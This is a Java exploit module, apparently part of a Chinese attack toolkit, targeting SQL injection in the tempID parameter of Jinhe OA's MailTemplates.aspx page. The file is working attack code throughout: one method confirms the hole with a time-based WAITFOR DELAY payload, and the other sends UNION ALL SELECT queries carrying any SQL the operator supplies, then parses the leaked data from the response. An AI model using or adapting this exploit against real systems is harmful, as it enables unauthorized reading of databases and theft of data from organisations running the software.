package exp.oa.jinheoa;

import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.util.HashMap;

public class jinhe_MailTemplates_sqli  implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            long var = HttpTools_getTime.get(url + "/C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%20;WAITFOR%20DELAY%20'0%3A0%3A3'%20--%20JtXl", head, "utf-8");
            if (var>3000) {
                String target_req = url + "/C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%20;WAITFOR%20DELAY%20'0%3A0%3A3'%20--%20JtXl";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_MailTemplates_sqli ]");
                    textArea.appendText("\n (1) 延时注入,sql: sqlserver");
                    textArea.appendText("\n (2) 联合查询注入, CMD输入sql语句, eg: user_name()");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get = HttpTools.get(url + "/C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%20UNION%20ALL%20SELECT%20"+ getAllEncode.getAllUrlEncode(sql,"")+"%2CNULL%2CNULL--%20JtXl", head, "utf-8");

            if (get.getText()!="" && get.getCode() == 200) {
                String var1 = get.getText();
                int var2 = getIndexOf.getLineNumber(var1,"widget-textinput");
                String var3 = getIndexOf.getMessage_useLine(var1,var2,var2).replace("\\s","");
                String var4 = var3.substring(var3.indexOf("value=\"")+7,var3.indexOf("\" />"));
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + var4);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
